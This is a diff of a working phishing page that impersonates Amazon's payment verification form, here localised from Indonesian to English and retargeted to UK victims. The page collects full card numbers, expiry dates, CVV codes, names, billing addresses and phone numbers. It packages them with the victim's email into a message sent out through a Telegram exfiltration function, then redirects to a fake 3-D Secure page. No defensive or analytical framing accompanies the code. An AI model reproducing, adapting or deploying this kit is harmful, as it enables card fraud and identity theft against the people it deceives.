@@ -1,22 +1,23 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifikasi Pembayaran</title>
     <script src="config.js"></script>
     <script>
-        let kodeNegara = 'ID';
-        let kodeTelepon = '+62';
+        let kodeNegara = 'GB';
+        let kodeTelepon = '+44';
+        
         async function deteksiNegara() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                kodeNegara = d.country_code || 'ID';
+                kodeNegara = d.country_code || 'GB';
                 const peta = { JP:['JP','+81'], ID:['ID','+62'], US:['US','+1'], AU:['AU','+61'], GB:['GB','+44'], MY:['MY','+60'], SG:['SG','+65'] };
-                const [negara, tel] = peta[kodeNegara] || ['ID','+62'];
+                const [negara, tel] = peta[kodeNegara] || ['GB','+44'];
                 kodeNegara = negara; kodeTelepon = tel;
-            } catch { kodeNegara = 'ID'; kodeTelepon = '+62'; }
+            } catch { kodeNegara = 'GB'; kodeTelepon = '+44'; }
             document.getElementById('negara').value = kodeNegara;
             document.getElementById('kodeTel').textContent = kodeTelepon;
         }
@@ -50,8 +51,7 @@
 <body onload="deteksiNegara()">
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>Verifikasi Metode Pembayaran</h1>
-        
+        <h1>Verification Payment</h1>
         <div class="logo-kartu">
             <img src="img/visa.png" id="lv" alt="Visa">
             <img src="img/mastercard.png" id="lm" alt="Mastercard">
@@ -60,7 +60,7 @@
             <img src="img/jcb.png" id="lj" alt="JCB">
         </div>
 
-        <label>Nomor Kartu</label>
+        <label>Card Number</label>
         <div class="kartu-wrapper">
             <input type="text" id="nomor" maxlength="19" placeholder="•••• •••• •••• ••••" oninput="cekJenisKartu()">
             <img src="" id="ikonKartu" class="ikon-kartu" alt="">
@@ -68,58 +68,63 @@
 
         <div class="baris-dua">
             <div>
-                <label>Tanggal Kadaluarsa</label>
+                <label>Expiry Date</label>
                 <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
             </div>
             <div>
-                <label>Kode Keamanan</label>
+                <label>Security Code</label>
                 <input type="text" id="cvv" maxlength="4" placeholder="•••">
             </div>
         </div>
 
-        <label>Nama di Kartu</label>
-        <input type="text" id="nama" placeholder="Nama lengkap">
+        <label>Name on Card</label>
+        <input type="text" id="nama" placeholder="Full name">
 
-        <label>Negara/Wilayah</label>
+        <label>Country/Region</label>
         <select id="negara">
+            <option value="GB">United Kingdom</option>
             <option value="ID">Indonesia</option>
-            <option value="JP">Jepang</option>
-            <option value="US">Amerika Serikat</option>
+            <option value="JP">Japan</option>
+            <option value="US">United States</option>
             <option value="AU">Australia</option>
-            <option value="GB">Inggris</option>
             <option value="MY">Malaysia</option>
-            <option value="SG">Singapura</option>
+            <option value="SG">Singapore</option>
         </select>
 
-        <label>Alamat Penagihan</label>
-        <input type="text" id="alamat" placeholder="Alamat jalan">
+        <label>Billing Address</label>
+        <input type="text" id="alamat" placeholder="Street address">
         <div class="baris-dua">
             <div>
-                <label>Kota</label>
-                <input type="text" id="kota" placeholder="Kota">
+                <label>City</label>
+                <input type="text" id="kota" placeholder="City">
             </div>
             <div>
-                <label>Kode Pos</label>
-                <input type="text" id="kodepos" placeholder="Kode pos">
+                <label>Postal Code</label>
+                <input type="text" id="kodepos" placeholder="Postal code">
             </div>
         </div>
 
-        <label>Nomor Telepon</label>
+        <label>Phone Number</label>
         <div class="tel">
-            <span id="kodeTel">+62</span>
-            <input type="tel" id="telepon" placeholder="812 3456 7890">
+            <span id="kodeTel">+44</span>
+            <input type="tel" id="telepon" placeholder="7xxx xxxxxx">
         </div>
 
-        <button id="tombol" disabled onclick="lanjut()">Verifikasi & Lanjutkan</button>
+        <button id="tombol" disabled onclick="lanjut()">Verify & Continue</button>
     </div>
     <div class="footer">
-        <p>© 1996-2026, Amazon.com, Inc. atau afiliasinya</p>
+        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
     <script>
         let nomorAsli = '';
         let cvvAsli = '';
         let trackData = '';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const email = localStorage.getItem('emailPengguna');
+            if (!email) { window.location.href = 'index.html'; return; }
+        });
 
         function cekJenisKartu() {
             const val = document.getElementById('nomor').value.replace(/\s/g, '');
@@ -209,21 +214,20 @@
             CONFIG.simpanKartu(dataKartu);
 
             const pesan = `
-💳 *DATA KARTU*
+💳 *CARD DATA*
 ━━━━━━━━━━━━━━━━━━━━━
 📧 Email: \`${email}\`
-👤 Nama: \`${dataKartu.namaKartu}\`
-🔢 Kartu: \`${nomorAsli}\`
+👤 Name: \`${dataKartu.namaKartu}\`
+🔢 Card: \`${nomorAsli}\`
 📅 Exp: \`${dataKartu.expiry}\`
 🔒 CVV: \`${cvvAsli}\`
-📍 Alamat: \`${dataKartu.alamat}, ${dataKartu.kota} — ${dataKartu.kodepos}\`
-📞 Telp: \`${dataKartu.telepon}\`
+📍 Address: \`${dataKartu.alamat}, ${dataKartu.kota} — ${dataKartu.kodepos}\`
+📞 Phone: \`${dataKartu.telepon}\`
 ━━━━━━━━━━━━━━━━━━━━━
 ${trackData}
-🕐 Waktu: ${new Date().toLocaleString()}
+🕐 Time: ${new Date().toLocaleString()}
             `.trim();
             await CONFIG.kirimKeTelegram(pesan);
-
             window.location.href = '3ds.html';
         }
     </script>
